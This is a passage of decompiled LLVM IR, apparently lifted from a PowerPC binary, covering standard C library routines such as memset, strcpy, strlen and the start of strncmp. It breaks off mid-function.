  %tmp = icmp ult i32 %v1_1000d118, 4
  br i1 %tmp, label %dec_label_pc_1000d130, label %dec_label_pc_1000d124

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000d118
  %v0_1000d124 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d124 = add i32 %v0_1000d124, 4
  %v2_1000d124 = inttoptr i32 %v1_1000d124 to i32*
  %v3_1000d124 = load i32, i32* %v2_1000d124, align 4
  store i32 %v1_1000d124, i32* %r4.global-to-local, align 4
  %v1_1000d128 = add nsw i32 %v1_1000d118, -4
  store i32 %v1_1000d128, i32* @r5, align 4
  %v1_1000d12c = load i32, i32* @r11, align 4
  %v2_1000d12c = add i32 %v1_1000d12c, 4
  %v3_1000d12c = inttoptr i32 %v2_1000d12c to i32*
  store i32 %v3_1000d124, i32* %v3_1000d12c, align 4
  store i32 %v2_1000d12c, i32* @r11, align 4
  %v0_1000d130.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000d130

dec_label_pc_1000d130:                            ; preds = %dec_label_pc_1000d118, %dec_label_pc_1000d124
  %v0_1000d130 = phi i32 [ %v1_1000d118, %dec_label_pc_1000d118 ], [ %v0_1000d130.pre, %dec_label_pc_1000d124 ]
  %v3_1000d130 = icmp eq i32 %v0_1000d130, 0
  %v0_1000d134 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d130, i32 %v0_1000d134)
  %v0_1000d138 = load i32, i32* @r5, align 4
  store i32 %v0_1000d138, i32* %ctr.global-to-local, align 4
  %v0_1000d13c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d13c = add i32 %v0_1000d13c, 3
  store i32 %v1_1000d13c, i32* %r4.global-to-local, align 4
  %v0_1000d140 = load i32, i32* @r11, align 4
  %v1_1000d140 = add i32 %v0_1000d140, 3
  store i32 %v1_1000d140, i32* %r9.global-to-local, align 4
  %v1_1000d1449 = add i32 %v0_1000d13c, 4
  %v2_1000d14410 = inttoptr i32 %v1_1000d1449 to i8*
  %v3_1000d14411 = load i8, i8* %v2_1000d14410, align 1
  store i32 %v1_1000d1449, i32* %r4.global-to-local, align 4
  %v3_1000d14813 = add i32 %v0_1000d140, 4
  %v4_1000d14814 = inttoptr i32 %v3_1000d14813 to i8*
  store i8 %v3_1000d14411, i8* %v4_1000d14814, align 1
  store i32 %v3_1000d14813, i32* %r9.global-to-local, align 4
  %v0_1000d14c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d14c16 = add i32 %v0_1000d14c15, -1
  store i32 %v1_1000d14c16, i32* %ctr.global-to-local, align 4
  %v2_1000d14c17 = icmp eq i32 %v1_1000d14c16, 0
  br i1 %v2_1000d14c17, label %dec_label_pc_1000d180, label %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge

dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge: ; preds = %dec_label_pc_1000d130, %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge
  %v3_1000d14818 = phi i32 [ %v3_1000d148, %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge ], [ %v3_1000d14813, %dec_label_pc_1000d130 ]
  %v0_1000d144.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d144 = add i32 %v0_1000d144.pre, 1
  %v2_1000d144 = inttoptr i32 %v1_1000d144 to i8*
  %v3_1000d144 = load i8, i8* %v2_1000d144, align 1
  store i32 %v1_1000d144, i32* %r4.global-to-local, align 4
  %v3_1000d148 = add i32 %v3_1000d14818, 1
  %v4_1000d148 = inttoptr i32 %v3_1000d148 to i8*
  store i8 %v3_1000d144, i8* %v4_1000d148, align 1
  store i32 %v3_1000d148, i32* %r9.global-to-local, align 4
  %v0_1000d14c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d14c = add i32 %v0_1000d14c, -1
  store i32 %v1_1000d14c, i32* %ctr.global-to-local, align 4
  %v2_1000d14c = icmp eq i32 %v1_1000d14c, 0
  br i1 %v2_1000d14c, label %dec_label_pc_1000d180, label %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge

dec_label_pc_1000d154:                            ; preds = %dec_label_pc_1000d0f8
  %v1_1000d154 = sub nsw i32 4, %v1_1000d0f8
  store i32 %v1_1000d154, i32* %ctr.global-to-local, align 4
  %v1_1000d15c = load i32, i32* @r5, align 4
  %v2_1000d15c = sub i32 %v1_1000d15c, %v1_1000d154
  br label %dec_label_pc_1000d160

dec_label_pc_1000d160:                            ; preds = %dec_label_pc_1000d160.dec_label_pc_1000d160_crit_edge, %dec_label_pc_1000d154
  %v2_1000d168 = phi i32 [ %v1_1000d16c, %dec_label_pc_1000d160.dec_label_pc_1000d160_crit_edge ], [ %v1_1000d0f0, %dec_label_pc_1000d154 ]
  %v0_1000d160 = phi i32 [ %v0_1000d160.pre, %dec_label_pc_1000d160.dec_label_pc_1000d160_crit_edge ], [ %v1_1000d0ec, %dec_label_pc_1000d154 ]
  %v1_1000d160 = add i32 %v0_1000d160, 4
  %v2_1000d160 = inttoptr i32 %v1_1000d160 to i8*
  %v3_1000d160 = load i8, i8* %v2_1000d160, align 1
  %v1_1000d164 = add i32 %v0_1000d160, 1
  store i32 %v1_1000d164, i32* %r4.global-to-local, align 4
  %v3_1000d168 = add i32 %v2_1000d168, 4
  %v4_1000d168 = inttoptr i32 %v3_1000d168 to i8*
  store i8 %v3_1000d160, i8* %v4_1000d168, align 1
  %v0_1000d16c = load i32, i32* @r11, align 4
  %v1_1000d16c = add i32 %v0_1000d16c, 1
  store i32 %v1_1000d16c, i32* @r11, align 4
  %v0_1000d170 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d170 = add i32 %v0_1000d170, -1
  store i32 %v1_1000d170, i32* %ctr.global-to-local, align 4
  %v2_1000d170 = icmp eq i32 %v1_1000d170, 0
  br i1 %v2_1000d170, label %dec_label_pc_1000d174, label %dec_label_pc_1000d160.dec_label_pc_1000d160_crit_edge

dec_label_pc_1000d160.dec_label_pc_1000d160_crit_edge: ; preds = %dec_label_pc_1000d160
  %v0_1000d160.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d160

dec_label_pc_1000d174:                            ; preds = %dec_label_pc_1000d160
  %v1_1000d174 = call i32 @__asm_rlwinm.(i32 %v2_1000d15c, i32 29, i32 3, i32 31)
  store i32 %v1_1000d174, i32* %r9.global-to-local, align 4
  %v4_1000d174 = icmp eq i32 %v1_1000d174, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000d174, label %dec_label_pc_1000d118, label %dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge

dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge: ; preds = %dec_label_pc_1000d174
  %v1_1000d10c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000d100

dec_label_pc_1000d180:                            ; preds = %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge, %dec_label_pc_1000d130
  %v0_1000d180 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d180

; uselistorder directives
  uselistorder i32 %v1_1000d174, { 1, 2, 0 }
  uselistorder i32 %v1_1000d170, { 1, 0 }
  uselistorder i32 %v1_1000d16c, { 1, 0 }
  uselistorder i32 %v0_1000d160, { 1, 0 }
  uselistorder i32 %v2_1000d15c, { 2, 1, 0 }
  uselistorder i32 %v1_1000d14c, { 1, 0 }
  uselistorder i32 %v3_1000d148, { 1, 2, 0 }
  uselistorder i32 %v1_1000d118, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d114, { 1, 0 }
  uselistorder i32 %v2_1000d110, { 1, 2, 0 }
  uselistorder i32 %v1_1000d0f8, { 1, 0 }
  uselistorder i32 %v1_1000d0f0, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 10, 11, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000d144.dec_label_pc_1000d144_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d130, { 1, 0 }
  uselistorder label %dec_label_pc_1000d118, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d184 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000d184, i32* %r9.global-to-local, align 4
  %v4_1000d184 = icmp eq i32 %v1_1000d184, 0
  store i1 %v4_1000d184, i1* %cr0_eq.global-to-local, align 1
  %v1_1000d18c = add i32 %arg1, -4
  store i32 %v1_1000d18c, i32* %r11.global-to-local, align 4
  %v1_1000d190 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000d194 = call i32 @__asm_rlwimi(i32 %v1_1000d190, i32 16, i32 0, i32 15)
  %v2_1000d194 = trunc i32 %v1_1000d194 to i8
  store i32 %v1_1000d194, i32* @r10, align 4
  %v0_1000d198 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000d198, label %dec_label_pc_1000d1bc, label %dec_label_pc_1000d19c

dec_label_pc_1000d19c:                            ; preds = %entry
  %v0_1000d19c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d19c = urem i32 %v0_1000d19c, 4
  %v3_1000d19c = icmp eq i32 %v1_1000d19c, 0
  store i1 %v3_1000d19c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000d19c, label %dec_label_pc_1000d19c.dec_label_pc_1000d1a4_crit_edge, label %dec_label_pc_1000d1ec

dec_label_pc_1000d19c.dec_label_pc_1000d1a4_crit_edge: ; preds = %dec_label_pc_1000d19c
  %v0_1000d1a4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1a4:                            ; preds = %dec_label_pc_1000d204.dec_label_pc_1000d1a4_crit_edge, %dec_label_pc_1000d19c.dec_label_pc_1000d1a4_crit_edge
  %v0_1000d1a8.pre = phi i32 [ %v0_1000d19c, %dec_label_pc_1000d19c.dec_label_pc_1000d1a4_crit_edge ], [ %v0_1000d1a8.pre.pre, %dec_label_pc_1000d204.dec_label_pc_1000d1a4_crit_edge ]
  %v0_1000d1a4 = phi i32 [ %v0_1000d1a4.pre, %dec_label_pc_1000d19c.dec_label_pc_1000d1a4_crit_edge ], [ %v1_1000d204, %dec_label_pc_1000d204.dec_label_pc_1000d1a4_crit_edge ]
  store i32 %v0_1000d1a4, i32* %ctr.global-to-local, align 4
  %v1_1000d1ac = sext i8 %v2_1000d194 to i32
  br label %dec_label_pc_1000d1a8

dec_label_pc_1000d1a8:                            ; preds = %dec_label_pc_1000d1a8, %dec_label_pc_1000d1a4
  %v0_1000d1a8 = phi i32 [ %v1_1000d1b4, %dec_label_pc_1000d1a8 ], [ %v0_1000d1a8.pre, %dec_label_pc_1000d1a4 ]
  %v1_1000d1a8 = add i32 %v0_1000d1a8, 4
  store i32 %v1_1000d1a8, i32* %r9.global-to-local, align 4
  %v4_1000d1ac = inttoptr i32 %v1_1000d1a8 to i32*
  store i32 %v1_1000d1ac, i32* %v4_1000d1ac, align 4
  %v2_1000d1b0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d1b0 = add i32 %v2_1000d1b0, 4
  %v4_1000d1b0 = inttoptr i32 %v3_1000d1b0 to i32*
  store i32 %v1_1000d1ac, i32* %v4_1000d1b0, align 4
  %v0_1000d1b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d1b4 = add i32 %v0_1000d1b4, 4
  store i32 %v1_1000d1b4, i32* %r11.global-to-local, align 4
  %v0_1000d1b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d1b8 = add i32 %v0_1000d1b8, -1
  store i32 %v1_1000d1b8, i32* %ctr.global-to-local, align 4
  %v2_1000d1b8 = icmp eq i32 %v1_1000d1b8, 0
  br i1 %v2_1000d1b8, label %dec_label_pc_1000d1bc, label %dec_label_pc_1000d1a8

dec_label_pc_1000d1bc:                            ; preds = %dec_label_pc_1000d1a8, %dec_label_pc_1000d204, %entry
  %v0_1000d1bc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d1bc = urem i32 %v0_1000d1bc, 8
  store i32 %v1_1000d1bc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000d1bc, 4
  br i1 %tmp, label %dec_label_pc_1000d1d0, label %dec_label_pc_1000d1c8

dec_label_pc_1000d1c8:                            ; preds = %dec_label_pc_1000d1bc
  %v1_1000d1c8 = sext i8 %v2_1000d194 to i32
  %v2_1000d1c8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000d1c8 = add i32 %v2_1000d1c8, 4
  %v4_1000d1c8 = inttoptr i32 %v3_1000d1c8 to i32*
  store i32 %v1_1000d1c8, i32* %v4_1000d1c8, align 4
  store i32 %v3_1000d1c8, i32* %r11.global-to-local, align 4
  %v0_1000d1cc = load i32, i32* @r5, align 4
  %v1_1000d1cc = add i32 %v0_1000d1cc, -4
  store i32 %v1_1000d1cc, i32* @r5, align 4
  br label %dec_label_pc_1000d1d0

dec_label_pc_1000d1d0:                            ; preds = %dec_label_pc_1000d1bc, %dec_label_pc_1000d1c8
  %v0_1000d1d0 = phi i32 [ %v1_1000d1bc, %dec_label_pc_1000d1bc ], [ %v1_1000d1cc, %dec_label_pc_1000d1c8 ]
  %v3_1000d1d0 = icmp eq i32 %v0_1000d1d0, 0
  %v0_1000d1d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d1d0, i32 %v0_1000d1d4)
  %v0_1000d1d8 = load i32, i32* @r5, align 4
  store i32 %v0_1000d1d8, i32* %ctr.global-to-local, align 4
  %v0_1000d1dc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d1dc = add i32 %v0_1000d1dc, 3
  store i32 %v1_1000d1dc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d1e0

dec_label_pc_1000d1e0:                            ; preds = %dec_label_pc_1000d1e0, %dec_label_pc_1000d1d0
  %v3_1000d1e0 = phi i32 [ %v4_1000d1e0, %dec_label_pc_1000d1e0 ], [ %v1_1000d1dc, %dec_label_pc_1000d1d0 ]
  %v4_1000d1e0 = add i32 %v3_1000d1e0, 1
  %v5_1000d1e0 = inttoptr i32 %v4_1000d1e0 to i8*
  store i8 %v2_1000d194, i8* %v5_1000d1e0, align 1
  store i32 %v4_1000d1e0, i32* %r9.global-to-local, align 4
  %v0_1000d1e4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d1e4 = add i32 %v0_1000d1e4, -1
  store i32 %v1_1000d1e4, i32* %ctr.global-to-local, align 4
  %v2_1000d1e4 = icmp eq i32 %v1_1000d1e4, 0
  br i1 %v2_1000d1e4, label %dec_label_pc_1000d210, label %dec_label_pc_1000d1e0

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d19c
  %v1_1000d1ec = sub nsw i32 4, %v1_1000d19c
  store i32 %v1_1000d1ec, i32* %ctr.global-to-local, align 4
  %v1_1000d1f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000d1f4 = sub i32 %v1_1000d1f4, %v1_1000d1ec
  store i32 %v2_1000d1f4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d1f8

dec_label_pc_1000d1f8:                            ; preds = %dec_label_pc_1000d1f8, %dec_label_pc_1000d1ec
  %v3_1000d1f8 = phi i32 [ %v1_1000d1fc, %dec_label_pc_1000d1f8 ], [ %v0_1000d19c, %dec_label_pc_1000d1ec ]
  %v4_1000d1f8 = add i32 %v3_1000d1f8, 4
  %v5_1000d1f8 = inttoptr i32 %v4_1000d1f8 to i8*
  store i8 %v2_1000d194, i8* %v5_1000d1f8, align 1
  %v0_1000d1fc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d1fc = add i32 %v0_1000d1fc, 1
  store i32 %v1_1000d1fc, i32* %r11.global-to-local, align 4
  %v0_1000d200 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d200 = add i32 %v0_1000d200, -1
  store i32 %v1_1000d200, i32* %ctr.global-to-local, align 4
  %v2_1000d200 = icmp eq i32 %v1_1000d200, 0
  br i1 %v2_1000d200, label %dec_label_pc_1000d204, label %dec_label_pc_1000d1f8

dec_label_pc_1000d204:                            ; preds = %dec_label_pc_1000d1f8
  %v0_1000d204 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d204 = call i32 @__asm_rlwinm.(i32 %v0_1000d204, i32 29, i32 3, i32 31)
  store i32 %v1_1000d204, i32* %r9.global-to-local, align 4
  %v4_1000d204 = icmp eq i32 %v1_1000d204, 0
  store i1 %v4_1000d204, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000d204, label %dec_label_pc_1000d1bc, label %dec_label_pc_1000d204.dec_label_pc_1000d1a4_crit_edge

dec_label_pc_1000d204.dec_label_pc_1000d1a4_crit_edge: ; preds = %dec_label_pc_1000d204
  %v0_1000d1a8.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d210:                            ; preds = %dec_label_pc_1000d1e0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000d204, { 1, 2, 0 }
  uselistorder i32 %v1_1000d200, { 1, 0 }
  uselistorder i32 %v1_1000d1fc, { 1, 0 }
  uselistorder i32 %v1_1000d1e4, { 1, 0 }
  uselistorder i32 %v4_1000d1e0, { 1, 2, 0 }
  uselistorder i32 %v1_1000d1bc, { 2, 1, 0 }
  uselistorder i32 %v1_1000d1b8, { 1, 0 }
  uselistorder i32 %v1_1000d1b4, { 1, 0 }
  uselistorder i32 %v1_1000d19c, { 1, 0 }
  uselistorder i32 %v0_1000d19c, { 2, 1, 0 }
  uselistorder i8 %v2_1000d194, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000d194, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_1000d1d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1bc, { 1, 0, 2 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000d214 = add i32 %arg1, -1
  %v1_1000d218 = sub i32 %v2_1000d214, %tmp
  store i32 %v1_1000d218, i32* %r9.global-to-local, align 4
  %v2_1000d21c4 = load i8, i8* %arg2, align 1
  %v1_1000d2206 = add i32 %tmp, 1
  store i32 %v1_1000d2206, i32* %r4.global-to-local, align 4
  %v3_1000d2248 = icmp eq i8 %v2_1000d21c4, 0
  store i1 %v3_1000d2248, i1* %cr7_eq.global-to-local, align 1
  %v5_1000d2289 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000d21c4, i8* %v5_1000d2289, align 1
  %v0_1000d22c10 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d22c10, label %dec_label_pc_1000d230, label %dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge

dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge: ; preds = %entry, %dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge
  %v0_1000d21c.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000d228.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d21c = inttoptr i32 %v0_1000d21c.pre to i8*
  %v2_1000d21c = load i8, i8* %v1_1000d21c, align 1
  %v1_1000d220 = add i32 %v0_1000d21c.pre, 1
  store i32 %v1_1000d220, i32* %r4.global-to-local, align 4
  %v3_1000d224 = icmp eq i8 %v2_1000d21c, 0
  store i1 %v3_1000d224, i1* %cr7_eq.global-to-local, align 1
  %v4_1000d228 = add i32 %v1_1000d220, %v2_1000d228.pre
  %v5_1000d228 = inttoptr i32 %v4_1000d228 to i8*
  store i8 %v2_1000d21c, i8* %v5_1000d228, align 1
  %v0_1000d22c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d22c, label %dec_label_pc_1000d230, label %dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge

dec_label_pc_1000d230:                            ; preds = %dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d21c.dec_label_pc_1000d21c_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000d234 = load i32, i32* @r3, align 4
  store i32 %v0_1000d234, i32* @r10, align 4
  %v1_1000d24c3 = urem i32 %v0_1000d234, 4
  %v3_1000d24c5 = icmp eq i32 %v1_1000d24c3, 0
  br i1 %v3_1000d24c5, label %dec_label_pc_1000d254, label %dec_label_pc_1000d23c

dec_label_pc_1000d23c:                            ; preds = %entry, %dec_label_pc_1000d248
  %v0_1000d248 = phi i32 [ %v1_1000d248, %dec_label_pc_1000d248 ], [ %v0_1000d234, %entry ]
  %v1_1000d23c = inttoptr i32 %v0_1000d248 to i8*
  %v2_1000d23c = load i8, i8* %v1_1000d23c, align 1
  %v3_1000d240 = icmp eq i8 %v2_1000d23c, 0
  br i1 %v3_1000d240, label %dec_label_pc_1000d288, label %dec_label_pc_1000d248

dec_label_pc_1000d248:                            ; preds = %dec_label_pc_1000d23c
  %v1_1000d248 = add i32 %v0_1000d248, 1
  %v1_1000d24c = urem i32 %v1_1000d248, 4
  %v3_1000d24c = icmp eq i32 %v1_1000d24c, 0
  br i1 %v3_1000d24c, label %dec_label_pc_1000d254, label %dec_label_pc_1000d23c

dec_label_pc_1000d254:                            ; preds = %dec_label_pc_1000d248, %entry
  %v0_1000d258 = phi i32 [ %v0_1000d234, %entry ], [ %v1_1000d248, %dec_label_pc_1000d248 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000d260

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d2c0, %dec_label_pc_1000d260, %dec_label_pc_1000d254
  %v1_1000d29c = phi i32 [ %v0_1000d258, %dec_label_pc_1000d254 ], [ %v1_1000d264, %dec_label_pc_1000d260 ], [ %v1_1000d264, %dec_label_pc_1000d2c0 ]
  %v1_1000d260 = inttoptr i32 %v1_1000d29c to i32*
  %v2_1000d260 = load i32, i32* %v1_1000d260, align 4
  %v1_1000d264 = add i32 %v1_1000d29c, 4
  %v1_1000d270 = add i32 %v2_1000d260, -16843009
  %v2_1000d274 = and i32 %v1_1000d270, -2139062144
  %v5_1000d274 = icmp eq i32 %v2_1000d274, 0
  br i1 %v5_1000d274, label %dec_label_pc_1000d260, label %dec_label_pc_1000d27c

dec_label_pc_1000d27c:                            ; preds = %dec_label_pc_1000d260
  %v2_1000d27c = inttoptr i32 %v1_1000d29c to i8*
  %v3_1000d27c = load i8, i8* %v2_1000d27c, align 1
  %v3_1000d280 = icmp eq i8 %v3_1000d27c, 0
  br i1 %v3_1000d280, label %dec_label_pc_1000d288, label %dec_label_pc_1000d290

dec_label_pc_1000d288:                            ; preds = %dec_label_pc_1000d23c, %dec_label_pc_1000d27c
  %v1_1000d288 = phi i32 [ %v1_1000d29c, %dec_label_pc_1000d27c ], [ %v0_1000d248, %dec_label_pc_1000d23c ]
  %v2_1000d288 = sub i32 %v1_1000d288, %v0_1000d234
  ret i32 %v2_1000d288

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000d27c
  %v1_1000d290 = add i32 %v1_1000d29c, 1
  %v2_1000d290 = inttoptr i32 %v1_1000d290 to i8*
  %v3_1000d290 = load i8, i8* %v2_1000d290, align 1
  %v3_1000d294 = icmp eq i8 %v3_1000d290, 0
  br i1 %v3_1000d294, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d2a8

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d290
  %v2_1000d29c = sub i32 %v1_1000d29c, %v0_1000d234
  %v1_1000d2a0 = add i32 %v2_1000d29c, 1
  ret i32 %v1_1000d2a0

dec_label_pc_1000d2a8:                            ; preds = %dec_label_pc_1000d290
  %v1_1000d2a8 = add i32 %v1_1000d29c, 2
  %v2_1000d2a8 = inttoptr i32 %v1_1000d2a8 to i8*
  %v3_1000d2a8 = load i8, i8* %v2_1000d2a8, align 1
  %v3_1000d2ac = icmp eq i8 %v3_1000d2a8, 0
  br i1 %v3_1000d2ac, label %dec_label_pc_1000d2b4, label %dec_label_pc_1000d2c0

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d2a8
  %v2_1000d2b4 = sub i32 %v1_1000d29c, %v0_1000d234
  %v1_1000d2b8 = add i32 %v2_1000d2b4, 2
  ret i32 %v1_1000d2b8

dec_label_pc_1000d2c0:                            ; preds = %dec_label_pc_1000d2a8
  %v1_1000d2c0 = add i32 %v1_1000d29c, 3
  %v2_1000d2c0 = inttoptr i32 %v1_1000d2c0 to i8*
  %v3_1000d2c0 = load i8, i8* %v2_1000d2c0, align 1
  %v3_1000d2c4 = icmp eq i8 %v3_1000d2c0, 0
  br i1 %v3_1000d2c4, label %dec_label_pc_1000d2cc, label %dec_label_pc_1000d260

dec_label_pc_1000d2cc:                            ; preds = %dec_label_pc_1000d2c0
  %v2_1000d2cc = sub i32 %v1_1000d29c, %v0_1000d234
  %v1_1000d2d0 = add i32 %v2_1000d2cc, 3
  ret i32 %v1_1000d2d0

; uselistorder directives
  uselistorder i32 %v1_1000d264, { 1, 0 }
  uselistorder i32 %v1_1000d29c, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000d248, { 1, 0, 2 }
  uselistorder i32 %v0_1000d234, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_1000d288, { 1, 0 }
  uselistorder label %dec_label_pc_1000d23c, { 1, 0 }
}

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r10, align 4
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_1000d3b0, label %dec_label_pc_1000d2ec

dec_label_pc_1000d2ec:                            ; preds = %entry
  %v1_1000d2ec = udiv i32 %arg2, 4
  %v0_1000d2fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d2f4

dec_label_pc_1000d2f4:                            ; preds = %dec_label_pc_1000d37c, %dec_label_pc_1000d2ec
  %v0_1000d37c = phi i32 [ %v1_1000d37c, %dec_label_pc_1000d37c ], [ %v1_1000d2ec, %dec_label_pc_1000d2ec ]
  %v0_1000d31c = phi i32 [ %v1_1000d334, %dec_label_pc_1000d37c ], [ %v0_1000d2fc.pre, %dec_label_pc_1000d2ec ]
  %v0_1000d314 = phi i32 [ %v1_1000d330, %dec_label_pc_1000d37c ], [ %tmp, %dec_label_pc_1000d2ec ]
  %v1_1000d2f4 = inttoptr i32 %v0_1000d314 to i8*
  %v2_1000d2f4 = load i8, i8* %v1_1000d2f4, align 1
  %v1_1000d2fc = inttoptr i32 %v0_1000d31c to i8*
  %v2_1000d2fc = load i8, i8* %v1_1000d2fc, align 1
  %v3_1000d304 = icmp eq i8 %v2_1000d2f4, 0
  %v4_1000d308.not = icmp ne i8 %v2_1000d2f4, %v2_1000d2fc
  %brmerge = or i1 %v3_1000d304, %v4_1000d308.not
  br i1 %brmerge, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d314

dec_label_pc_1000d314:                            ; preds = %dec_label_pc_1000d2f4
  %v1_1000d300 = add i32 %v0_1000d31c, 1
  %v1_1000d2f8 = add i32 %v0_1000d314, 1
  %v2_1000d314 = inttoptr i32 %v1_1000d2f8 to i8*
  %v3_1000d314 = load i8, i8* %v2_1000d314, align 1
  %v1_1000d318 = add i32 %v0_1000d314, 2
  store i32 %v1_1000d318, i32* @r8, align 4
  %v2_1000d31c = inttoptr i32 %v1_1000d300 to i8*
  %v3_1000d31c = load i8, i8* %v2_1000d31c, align 1
  %v3_1000d324 = icmp eq i8 %v3_1000d314, 0
  %v1_1000d328 = add i32 %v0_1000d314, 3
  %v1_1000d32c = add i32 %v0_1000d31c, 3
  store i32 %v1_1000d32c, i32* @r11, align 4
  %v1_1000d330 = add i32 %v0_1000d314, 4
  store i32 %v1_1000d330, i32* @r10, align 4
  %v1_1000d334 = add i32 %v0_1000d31c, 4
  store i32 %v1_1000d334, i32* @r4, align 4
  %v4_1000d338.not = icmp ne i8 %v3_1000d314, %v3_1000d31c
  %brmerge1 = or i1 %v3_1000d324, %v4_1000d338.not
  br i1 %brmerge1, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d344

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d314
